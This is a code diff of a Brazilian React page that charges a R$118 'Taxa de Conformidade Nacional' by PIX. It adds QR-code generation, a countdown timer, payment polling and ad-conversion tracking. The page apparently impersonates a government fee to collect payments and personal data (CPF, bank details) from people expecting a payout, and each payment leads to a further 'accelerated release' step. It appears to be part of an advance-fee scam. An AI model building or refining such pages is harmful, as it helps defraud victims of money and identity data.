@@ -1,7 +1,7 @@
 import { useState, useEffect } from "react";
 import { Button } from "@/components/ui/button";
 import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
-import { AlertTriangle, CheckCircle2, Info, Clock, DollarSign, FileText, ReceiptText, HelpCircle, LockKeyhole, Timer, Shield, ArrowRightCircle } from "lucide-react";
+import { AlertTriangle, CheckCircle2, Info, Clock, DollarSign, FileText, ReceiptText, HelpCircle, LockKeyhole, Timer, Shield, ArrowRightCircle, Copy, Clipboard } from "lucide-react";
 import { useLocation } from "wouter";
 import Header from "@/components/Header";
 import Footer from "@/components/Footer";
@@ -9,6 +9,8 @@ import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
 import { Badge } from "@/components/ui/badge";
 import { useToast } from "@/hooks/use-toast";
 import ScrollToTop from "@/components/ScrollToTop";
+import { playNotificationSound } from "@/components/NotificationSound";
+import { sendPixGeneratedNotification } from "@/lib/utmify";
 
 // Funções de formatação
 const formatarCPF = (cpf: string) => {
@@ -41,6 +43,15 @@ export default function TaxaComplementar() {
   // Valor da Taxa de Conformidade Nacional (TCN)
   const VALOR_TAXA_CONFORMIDADE = 118;
   
+  // Estados para gerenciar o pagamento
+  const [pagamentoId, setPagamentoId] = useState("");
+  const [pixCode, setPixCode] = useState("");
+  const [pixQrCode, setPixQrCode] = useState("");
+  const [status, setStatus] = useState<"loading" | "success" | "paid" | "error">("loading");
+  const [tempoRestante, setTempoRestante] = useState<number>(900); // 15 minutos em segundos
+  const [copiado, setCopiado] = useState(false);
+  const [verificandoPagamento, setVerificandoPagamento] = useState(false);
+  
   // Estados para armazenar dados da solicitação
   const [protocolo, setProtocolo] = useState("");
   const [dataAtual, setDataAtual] = useState("");
@@ -58,6 +69,163 @@ export default function TaxaComplementar() {
     agencia: "",
     conta: ""
   });
+  
+  // Copiar o código PIX para a área de transferência
+  const copiarPix = async () => {
+    if (pixCode) {
+      try {
+        await navigator.clipboard.writeText(pixCode);
+        setCopiado(true);
+        toast({
+          title: "Código PIX copiado!",
+          description: "O código PIX foi copiado para a área de transferência.",
+          duration: 3000,
+        });
+        
+        setTimeout(() => setCopiado(false), 3000);
+      } catch (err) {
+        toast({
+          title: "Erro ao copiar código",
+          description: "Não foi possível copiar o código PIX automaticamente. Por favor, copie manualmente.",
+          variant: "destructive",
+          duration: 3000,
+        });
+      }
+    }
+  };
+
+  // Formatar o tempo restante em minutos e segundos
+  const formatarTempoRestante = () => {
+    const minutos = Math.floor(tempoRestante / 60);
+    const segundos = tempoRestante % 60;
+    return `${minutos.toString().padStart(2, '0')}:${segundos.toString().padStart(2, '0')}`;
+  };
+  
+  // Iniciar verificação de status de pagamento
+  const verificarStatusPagamento = async (pagamentoId: string) => {
+    setVerificandoPagamento(true);
+    try {
+      const response = await fetch(`/api/pagamentos/${pagamentoId}/status`);
+      if (!response.ok) {
+        throw new Error('Erro ao verificar o status do pagamento');
+      }
+      
+      const data = await response.json();
+      console.log("Status do pagamento:", data);
+      
+      if (data.status === "PAID" || data.status === "COMPLETED") {
+        setStatus("paid");
+        
+        // Redirecionar para a página de Liberação Acelerada
+        const params = new URLSearchParams();
+        params.append('nome', dadosSolicitacao.nome);
+        params.append('cpf', dadosSolicitacao.cpf);
+        params.append('email', dadosSolicitacao.email);
+        params.append('telefone', dadosSolicitacao.telefone);
+        params.append('valor', dadosSolicitacao.valor);
+        params.append('companhia', dadosSolicitacao.companhia);
+        params.append('estado', dadosSolicitacao.estado);
+        params.append('nasc', dadosSolicitacao.nasc);
+        params.append('pagamentoIdTCN', pagamentoId);
+        params.append('dataPagamento', new Date().toISOString());
+        
+        playNotificationSound();
+        
+        setTimeout(() => {
+          navigate(`/lar?${params.toString()}`);
+        }, 2000);
+      } else {
+        // Continuar verificando a cada 10 segundos
+        setTimeout(() => verificarStatusPagamento(pagamentoId), 10000);
+      }
+    } catch (error) {
+      console.error("Erro ao verificar status do pagamento:", error);
+      setTimeout(() => verificarStatusPagamento(pagamentoId), 15000);
+    }
+  };
+
+  // Gerar pagamento PIX
+  const gerarPagamentoPix = async () => {
+    try {
+      setStatus("loading");
+      
+      // Dados para criação do PIX
+      const paymentData = {
+        amount: 118, // R$ 118,00
+        name: dadosSolicitacao.nome,
+        email: dadosSolicitacao.email,
+        cpf: dadosSolicitacao.cpf,
+        phone: dadosSolicitacao.telefone,
+        title: "Taxa de Conformidade Nacional (TCN)"
+      };
+      
+      // Chamar API para gerar o PIX
+      const response = await fetch('/api/pagamentos', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(paymentData),
+      });
+      
+      if (!response.ok) {
+        throw new Error('Erro ao gerar pagamento PIX');
+      }
+      
+      const data = await response.json();
+      console.log("Pagamento PIX gerado:", data);
+      
+      // Atualizar os estados com os dados do pagamento
+      setPagamentoId(data.id);
+      setPixCode(data.pixCode);
+      setPixQrCode(data.pixQrCode);
+      setStatus("success");
+      
+      // Enviar notificação para UTMify
+      try {
+        await sendPixGeneratedNotification(
+          data.id,
+          {
+            name: dadosSolicitacao.nome,
+            email: dadosSolicitacao.email,
+            phone: dadosSolicitacao.telefone,
+            document: dadosSolicitacao.cpf
+          },
+          11800, // R$ 118,00 em centavos
+          undefined,
+          "TCN" // Tipo de produto: TCN
+        );
+      } catch (error) {
+        console.error("Erro ao enviar notificação para UTMify:", error);
+      }
+      
+      // Iniciar verificação de status
+      verificarStatusPagamento(data.id);
+      
+      // Iniciar contagem regressiva
+      const interval = setInterval(() => {
+        setTempoRestante((prev) => {
+          if (prev <= 1) {
+            clearInterval(interval);
+            return 0;
+          }
+          return prev - 1;
+        });
+      }, 1000);
+      
+      return () => clearInterval(interval);
+    } catch (error) {
+      console.error("Erro ao gerar pagamento PIX:", error);
+      setStatus("error");
+      
+      toast({
+        title: "Erro ao gerar pagamento",
+        description: "Não foi possível gerar o pagamento PIX. Por favor, tente novamente.",
+        variant: "destructive",
+        duration: 5000,
+      });
+    }
+  };
   
   // Efeito para capturar os parâmetros da URL e atualizar o estado
   useEffect(() => {
@@ -102,22 +270,10 @@ export default function TaxaComplementar() {
     setProtocolo(`${cpf.substring(0, 4)}4714${cpf.substring(6, 9)}`);
   }, [location]);
   
-  // Função para prosseguir para a página de pagamento da TCN
+  // Função para gerar o pagamento PIX da TCN
   const prosseguirParaPagamentoTCN = () => {
-    const params = new URLSearchParams();
-    
-    // Adicionar todos os dados necessários para a próxima página
-    Object.entries(dadosSolicitacao).forEach(([key, value]) => {
-      params.append(key, value);
-    });
-    
-    params.append('valorTCN', VALOR_TAXA_CONFORMIDADE.toString());
-    params.append('protocolo', protocolo);
-    
-    // Redirecionar para a página de pagamento da taxa complementar
-    setTimeout(() => {
-      navigate(`/tcn?${params.toString()}`);
-    }, 500);
+    // Gerar o pagamento PIX
+    gerarPagamentoPix();
   };
   
   // Calcula valores formatados
@@ -216,18 +372,114 @@ export default function TaxaComplementar() {
                             </ul>
                           </div>
                           
-                          {/* Botão para prosseguir */}
-                          <div className="mt-6">
-                            <Button 
-                              onClick={prosseguirParaPagamentoTCN}
-                              className="w-full bg-[#1351B4] hover:bg-[#0B3B8F] text-white py-6 text-lg"
-                            >
-                              PROSSEGUIR PARA PAGAMENTO
-                            </Button>
-                            <p className="text-xs text-gray-500 mt-2 text-center">
-                              Ao prosseguir, você será direcionado para a página de pagamento da Taxa de Conformidade Nacional.
-                            </p>
-                          </div>
+                          {/* Mostrar conteúdo com base no status do pagamento */}
+                          {(status === "loading" || status === "error" || status === null) && (
+                            <div className="mt-6">
+                              <Button 
+                                onClick={prosseguirParaPagamentoTCN}
+                                className="w-full bg-[#1351B4] hover:bg-[#0B3B8F] text-white py-6 text-lg"
+                                disabled={status === "loading"}
+                              >
+                                {status === "loading" ? (
+                                  <>
+                                    <span className="animate-spin mr-2">⟳</span>
+                                    Gerando pagamento...
+                                  </>
+                                ) : (
+                                  "PROSSEGUIR PARA PAGAMENTO"
+                                )}
+                              </Button>
+                              <p className="text-xs text-gray-500 mt-2 text-center">
+                                Ao prosseguir, será gerado o PIX para pagamento da Taxa de Conformidade Nacional.
+                              </p>
+                            </div>
+                          )}
+                          
+                          {/* Exibir QR Code e código PIX */}
+                          {status === "success" && (
+                            <div className="mt-4 border-t border-gray-200 pt-6">
+                              <div className="bg-white p-4 rounded-lg border border-gray-200 shadow-sm">
+                                <h4 className="text-lg font-bold text-gray-900 mb-2 text-center">
+                                  Pagamento PIX
+                                </h4>
+                                <p className="text-sm text-gray-600 mb-4 text-center">
+                                  Valor: <span className="font-bold text-green-600">{valorTaxaConformidadeFormatado}</span>
+                                </p>
+                                
+                                <div className="flex flex-col items-center">
+                                  <div className="bg-white p-2 border border-gray-200 rounded-lg mb-4">
+                                    <img src={pixQrCode} alt="QR Code PIX" className="h-48 w-48" />
+                                  </div>
+                                  
+                                  <div className="w-full p-3 bg-gray-50 rounded-md border border-gray-200 flex flex-col mb-4">
+                                    <p className="text-xs text-gray-500 mb-1">Código PIX (clique para copiar):</p>
+                                    <div 
+                                      onClick={copiarPix}
+                                      className="bg-white p-3 rounded border border-gray-200 text-xs text-gray-800 font-mono cursor-pointer hover:bg-blue-50 transition-colors relative overflow-auto break-all"
+                                    >
+                                      {pixCode}
+                                      <div className="absolute top-2 right-2">
+                                        {copiado ? (
+                                          <div className="bg-green-100 text-green-600 p-1 rounded-full">
+                                            <CheckCircle2 className="h-4 w-4" />
+                                          </div>
+                                        ) : (
+                                          <div className="text-blue-500 hover:text-blue-700">
+                                            <Copy className="h-4 w-4" />
+                                          </div>
+                                        )}
+                                      </div>
+                                    </div>
+                                  </div>
+                                  
+                                  <div className="text-center text-sm text-gray-600 mb-2">
+                                    <div className="flex items-center justify-center mb-1">
+                                      <Clock className="h-4 w-4 text-amber-500 mr-1" />
+                                      <span>Tempo restante: <b>{formatarTempoRestante()}</b></span>
+                                    </div>
+                                    <p>Abrindo seu aplicativo bancário...</p>
+                                  </div>
+                                  
+                                  <div className="w-full mt-4 space-y-2">
+                                    <div className="text-xs text-gray-500 bg-blue-50 p-3 rounded-md border border-blue-100">
+                                      <p className="mb-1 font-medium text-blue-700">Como pagar:</p>
+                                      <ol className="list-decimal list-inside space-y-1 text-gray-600">
+                                        <li>Abra o app do seu banco</li>
+                                        <li>Escolha pagar com PIX</li>
+                                        <li>Escaneie o QR code ou cole o código PIX</li>
+                                        <li>Confirme as informações e finalize o pagamento</li>
+                                      </ol>
+                                    </div>
+                                    
+                                    <Button
+                                      className="w-full bg-amber-600 hover:bg-amber-700 mt-2"
+                                      onClick={copiarPix}
+                                    >
+                                      <Clipboard className="h-4 w-4 mr-2" />
+                                      {copiado ? "Código copiado!" : "Copiar código PIX"}
+                                    </Button>
+                                    
+                                    <p className="text-center text-xs text-gray-500 mt-2">
+                                      Assim que o pagamento for confirmado, você será 
+                                      redirecionado automaticamente
+                                    </p>
+                                  </div>
+                                </div>
+                              </div>
+                            </div>
+                          )}
+                          
+                          {status === "paid" && (
+                            <div className="mt-6 p-4 bg-green-50 rounded-lg border border-green-300">
+                              <CheckCircle2 className="h-8 w-8 text-green-600 mx-auto mb-2" />
+                              <h4 className="text-lg font-semibold text-center text-green-800 mb-2">
+                                Pagamento Confirmado!
+                              </h4>
+                              <p className="text-sm text-green-700 text-center">
+                                Seu pagamento foi processado com sucesso. Você será redirecionado em instantes...
+                              </p>
+                            </div>
+                          )}
                           
                           {/* Botão para testes - Pular para a página LAR */}
                           <div className="mt-4">
